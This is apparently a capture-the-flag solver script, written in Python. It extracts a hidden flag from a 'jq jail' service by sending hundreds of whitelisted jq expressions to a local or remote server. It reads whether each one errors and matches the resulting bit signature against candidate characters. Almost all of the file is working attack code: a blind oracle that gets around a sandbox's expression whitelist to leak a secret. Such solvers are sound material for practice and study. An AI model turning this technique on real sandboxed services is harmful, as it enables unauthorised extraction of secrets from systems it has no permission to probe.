#!/usr/bin/env python3
"""Fast signature solver for the 9-byte target selected by the jq jail.

The whitelist prevents direct indexing, so each legal query observes whether a
predicate accepts *any* tostream element.  For a 9-byte jail{???} value, known
prefix/suffix and three unknown bytes let us encode every query as three ASCII
membership masks.  The complete response vector is then a bit signature:

    signature(c5, c6, c7) = sig5[c5] | sig6[c6] | sig7[c7]

This cuts the remote phase from thousands of queries to a few hundred and
allows all printable-ASCII triples to be checked locally in under a second.
"""
from __future__ import annotations

import argparse
import itertools
import json
import sys
from pathlib import Path
from typing import Iterable, Sequence

import solve_checked as base
from solve_set_oracle_v2 import (
    accept_sets_by_jq,
    build_value_universe,
    predicate,
    query_with_progress,
    unique_chains,
)


def printable_ascii() -> str:
    return "".join(chr(value) for value in range(32, 127))


def expression(feature_index: int, reverse: bool, ops: Sequence[str]) -> str:
    feature = base.FEATURES[feature_index]
    start = base.BASE + ("|explode|reverse|implode" if reverse else "")
    return f"{start}|explode|tostream|{feature.suffix}|{predicate(list(ops))}|error"


def build_patterns(
    length: int,
    charset: str,
    chains: list[list[str]],
    accepts: list[set[int]],
):
    domains = {
        position: base.fixed_domain(position, length, charset)
        for position in range(length)
    }
    unknown_positions = [
        position for position, chars in domains.items() if len(chars) > 1
    ]
    known = {
        position: chars[0] for position, chars in domains.items() if len(chars) == 1
    }
    if len(unknown_positions) != 3:
        raise RuntimeError(
            f"signature solver expects exactly 3 unknown positions, got "
            f"{unknown_positions} for length {length}"
        )

    all_mask = (1 << len(charset)) - 1
    unique: dict[tuple[int, ...], tuple[int, bool, list[str]]] = {}

    for feature_index, feature in enumerate(base.FEATURES):
        for reverse in (False, True):
            nuisance = feature.evaluate(length - 1, None)
            for ops, accept in zip(chains, accepts):
                if nuisance in accept:
                    continue

                forced = False
                for position, char in known.items():
                    index = length - 1 - position if reverse else position
                    if feature.evaluate(index, char) in accept:
                        forced = True
                        break
                if forced:
                    continue

                masks: list[int] = []
                for position in unknown_positions:
                    index = length - 1 - position if reverse else position
                    mask = 0
                    for char_index, char in enumerate(charset):
                        if feature.evaluate(index, ord(char)) in accept:
                            mask |= 1 << char_index
                    masks.append(mask)

                # No unknown can trigger it, or one unknown triggers it for all
                # characters; both cases are constant and give no information.
                if not any(masks) or any(mask == all_mask for mask in masks):
                    continue

                unique.setdefault(
                    tuple(masks), (feature_index, reverse, list(ops))
                )

    patterns = [
        (masks, descriptor[0], descriptor[1], descriptor[2])
        for masks, descriptor in unique.items()
    ]
    return unknown_positions, known, patterns


def character_signatures(
    charset: str, patterns: Sequence[tuple[tuple[int, ...], int, bool, list[str]]]
) -> list[list[int]]:
    signatures = [[0 for _ in charset] for _ in range(3)]
    for query_index, (masks, _, _, _) in enumerate(patterns):
        bit = 1 << query_index
        for position_index, mask in enumerate(masks):
            for char_index in range(len(charset)):
                if (mask >> char_index) & 1:
                    signatures[position_index][char_index] |= bit
    return signatures


def enumerate_matches(
    charset: str,
    signatures: list[list[int]],
    observed_signature: int,
    limit: int = 100,
) -> list[tuple[str, str, str]]:
    matches: list[tuple[str, str, str]] = []
    for first_index, first in enumerate(charset):
        first_sig = signatures[0][first_index]
        for second_index, second in enumerate(charset):
            pair_sig = first_sig | signatures[1][second_index]
            for third_index, third in enumerate(charset):
                if pair_sig | signatures[2][third_index] == observed_signature:
                    matches.append((first, second, third))
                    if len(matches) >= limit:
                        return matches
    return matches


def render_flag(
    length: int,
    unknown_positions: Sequence[int],
    known: dict[int, int],
    body: Sequence[str],
) -> str:
    chars = ["?"] * length
    for position, char in known.items():
        chars[position] = chr(char)
    for position, char in zip(unknown_positions, body):
        chars[position] = char
    return "".join(chars)


def query_present_for_flag(
    flag: str, feature_index: int, reverse: bool, accept: set[int]
) -> bool:
    feature = base.FEATURES[feature_index]
    length = len(flag)
    if feature.evaluate(length - 1, None) in accept:
        return True
    for position, char in enumerate(flag):
        index = length - 1 - position if reverse else position
        if feature.evaluate(index, ord(char)) in accept:
            return True
    return False


def discriminate_candidates(
    oracle,
    candidates: list[str],
    length: int,
    charset: str,
    chains_path: Path,
    jq_cmd: str,
) -> list[str]:
    if len(candidates) <= 1:
        return candidates

    chains = unique_chains(chains_path)
    universe = build_value_universe(base, length, charset, len(base.FEATURES))
    accepts = accept_sets_by_jq(jq_cmd, chains, universe)
    descriptors = [
        (feature_index, reverse, ops, accept)
        for feature_index in range(len(base.FEATURES))
        for reverse in (False, True)
        for ops, accept in zip(chains, accepts)
    ]

    round_number = 0
    while len(candidates) > 1:
        round_number += 1
        best = None
        for feature_index, reverse, ops, accept in descriptors:
            predicted = [
                query_present_for_flag(flag, feature_index, reverse, accept)
                for flag in candidates
            ]
            true_count = sum(predicted)
            if true_count == 0 or true_count == len(candidates):
                continue
            score = abs(len(candidates) - 2 * true_count)
            if best is None or score < best[0]:
                best = (score, feature_index, reverse, ops, accept, predicted)
                if score == 0:
                    break

        if best is None:
            print(
                "[!] remaining candidates collide under all fallback chains",
                flush=True,
            )
            return candidates

        _, feature_index, reverse, ops, _, predicted = best
        answer = oracle.query_batch(
            [expression(feature_index, reverse, ops)]
        )[0]
        present = answer == "error"
        candidates = [
            flag
            for flag, prediction in zip(candidates, predicted)
            if prediction == present
        ]
        print(
            f"[*] fallback discriminator {round_number}: "
            f"feature={base.FEATURES[feature_index].name}, reverse={reverse}, "
            f"present={present}, remaining={len(candidates)}",
            flush=True,
        )

    return candidates


def solve(args) -> str:
    charset = args.charset
    singleton_raw = json.loads(args.length_chains.read_text())
    singleton_chains = {int(value): ops for value, ops in singleton_raw.items()}

    if args.mode == "local":
        oracle = base.LocalServerOracle(args.server, args.flag, args.jq, args.timeout)
        jq_cmd = args.jq
    else:
        oracle = base.RemoteOracle(args.host, args.port, args.timeout)
        jq_cmd = args.jq

    try:
        print("[*] recovering selected-string length", flush=True)
        length = base.recover_length(
            oracle, singleton_chains, args.min_length, args.max_length
        )
        print(f"[+] selected-string length = {length}", flush=True)

        chains = unique_chains(args.length_chains)
        universe = build_value_universe(base, length, charset, len(base.FEATURES))
        accepts = accept_sets_by_jq(jq_cmd, chains, universe)
        unknown_positions, known, patterns = build_patterns(
            length, charset, chains, accepts
        )
        print(
            f"[+] unknown positions: {unknown_positions}; "
            f"unique informative queries: {len(patterns)}",
            flush=True,
        )

        expressions = [
            expression(feature_index, reverse, ops)
            for _, feature_index, reverse, ops in patterns
        ]
        answers = query_with_progress(oracle, expressions, args.progress_batch)

        observed_signature = 0
        for query_index, answer in enumerate(answers):
            if answer == "error":
                observed_signature |= 1 << query_index

        signatures = character_signatures(charset, patterns)
        bodies = enumerate_matches(
            charset, signatures, observed_signature, limit=args.candidate_limit
        )
        candidates = [
            render_flag(length, unknown_positions, known, body)
            for body in bodies
        ]
        print(f"[+] signature candidates ({len(candidates)}): {candidates}", flush=True)

        if not candidates:
            raise RuntimeError(
                "no printable-ASCII candidate matches the remote signature; "
                "the selected value may not be the flag or may contain non-ASCII bytes"
            )

        if len(candidates) > 1:
            candidates = discriminate_candidates(
                oracle,
                candidates,
                length,
                charset,
                args.fallback_chains,
                jq_cmd,
            )

        if len(candidates) != 1:
            raise RuntimeError(f"could not obtain a unique candidate: {candidates}")
        return candidates[0]
    finally:
        oracle.close()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--length-chains", type=Path, default=Path("singletons.json"))
    parser.add_argument("--fallback-chains", type=Path, default=Path("chains_225.json"))
    parser.add_argument("--charset", default=printable_ascii())
    parser.add_argument("--min-length", type=int, default=6)
    parser.add_argument("--max-length", type=int, default=128)
    parser.add_argument("--progress-batch", type=int, default=96)
    parser.add_argument("--candidate-limit", type=int, default=100)
    parser.add_argument("--jq", default="jq")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    local = subparsers.add_parser("local")
    local.add_argument("--server", type=Path, default=Path("server.py"))
    local.add_argument("--flag", default="jail{A-!}")
    local.add_argument("--timeout", type=int, default=300)

    remote = subparsers.add_parser("remote")
    remote.add_argument("host")
    remote.add_argument("port", type=int)
    remote.add_argument("--timeout", type=int, default=300)

    args = parser.parse_args()
    result = solve(args)
    print(f"[+] recovered selected value: {result!r}", flush=True)
    if args.mode == "local" and result != args.flag:
        print(
            f"[-] local verification failed: expected {args.flag!r}",
            file=sys.stderr,
            flush=True,
        )
        return 1
    print("[+] verification successful", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
